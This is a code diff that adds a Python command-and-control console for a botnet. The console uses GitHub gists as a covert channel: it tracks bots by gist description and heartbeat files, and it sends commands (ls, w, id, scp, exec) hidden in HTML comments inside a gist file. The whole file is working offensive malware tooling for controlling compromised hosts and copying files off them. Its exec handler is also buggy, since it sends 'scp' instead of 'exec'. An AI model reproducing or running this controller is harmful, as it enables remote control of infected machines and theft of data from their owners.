@@ -1,7 +1,128 @@
-from github import Github
+from github import Github, InputFileContent
+from threading import Thread
 from dotenv import load_dotenv
-import os
+from time import time, sleep
+from math import floor
+from os import getenv
 
 load_dotenv()
-g = Github(os.getenv('GITHUB_TOKEN'))
+g = Github(getenv('GITHUB_TOKEN'))
+me = g.get_user()
+bots = {}
 
+def get_bots():
+  gists = me.get_gists()
+  for gist in gists:
+    if gist.description == 'bsy-cc' and not gist.id in bots:
+      bots[gist.id] = False
+
+def check_hearbeat():
+  now = floor(time())
+  for gid in bots.keys():
+    hb = g.get_gist(gid).files.get('heartbeat.md')
+    if hb is not None:
+      bots[gid] = now - int(hb.content[9:-4]) < 10
+
+def update_botlist():
+  while True:
+    get_bots()
+    check_hearbeat()
+    sleep(10)
+
+def print_help():
+  print('Available commands:')
+  print('  list <- print the list of IDs of currently active bots')
+  print('  help <- print this list of commands')
+  print('  ls <bot-id> <path>')
+  print('  w <bot-id>')
+  print('  id <bot-id>')
+  print('  scp <bot-id> <src_path> <dest_path>')
+  print('  exec <bot-id> <path>')
+  print()
+
+Thread(target=update_botlist, daemon=True).start()
+print_help()
+
+def submit_to_bot(id, cmd):
+  if len(id) != 32 or not id in bots or not bots[id]:
+    print('ERROR: Invalid bot ID')
+    return None
+
+  g.get_gist(id).edit(files={
+    'comm.md': InputFileContent(f'hi\n<!-- req {cmd} -->')
+  })
+
+def cmd_ls(cmd):
+  if len(cmd) < 3 or len(cmd[2]) < 1:
+    print('ERROR: Invalid arguments')
+    return
+
+  res = submit_to_bot(cmd[1], f'ls {cmd[2]}')
+  if res is None:
+    return
+
+def cmd_w(cmd):
+  if len(cmd) < 2:
+    print('ERROR: Missing arguments')
+    return
+
+  res = submit_to_bot(cmd[1], 'w')
+  if res is None:
+    return
+
+def cmd_id(cmd):
+  if len(cmd) < 2:
+    print('ERROR: Missing arguments')
+    return
+
+  res = submit_to_bot(cmd[1], 'id')
+  if res is None:
+    return
+
+def cmd_scp(cmd):
+  if len(cmd) < 4 or len(cmd[2]) < 1 or len(cmd[3]) < 1:
+    print('ERROR: Invalid arguments')
+    return
+
+  res = submit_to_bot(cmd[1], f'scp {cmd[2]} {cmd[3]}')
+  if res is None:
+    return
+
+def cmd_exec(cmd):
+  if len(cmd) < 3 or len(cmd[2]) < 1:
+    print('ERROR: Invalid arguments')
+    return
+
+  res = submit_to_bot(cmd[1], f'scp {cmd[2]}')
+  if res is None:
+    return
+
+def main():
+  while True:
+    cmd = input('> ').split(' ')
+    if cmd[0] == 'list':
+      count = 0
+      for gid in bots.keys():
+        if bots[gid]:
+          print(gid)
+          count += 1
+
+      if count == 0:
+        print('-- No bots currently active --')
+    elif cmd[0] == 'ls':
+      cmd_ls(cmd)
+    elif cmd[0] == 'w':
+      cmd_w(cmd)
+    elif cmd[0] == 'id':
+      cmd_id(cmd)
+    elif cmd[0] == 'scp':
+      cmd_scp(cmd)
+    elif cmd[0] == 'exec':
+      cmd_exec(cmd)
+    else:
+      print('ERROR: Unknown comamnd')
+
+try:
+  main()
+except KeyboardInterrupt:
+  exit(0)
